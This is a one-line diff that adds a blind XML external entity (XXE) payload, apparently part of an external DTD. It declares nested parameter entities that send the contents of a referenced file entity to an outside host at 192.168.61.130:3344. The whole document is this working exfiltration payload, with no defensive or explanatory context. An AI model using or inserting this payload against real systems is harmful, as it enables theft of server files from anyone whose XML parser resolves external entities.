@@ -1,0 +1,1 @@
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://192.168.61.130:3344/?content=%file;'>"> %payload;
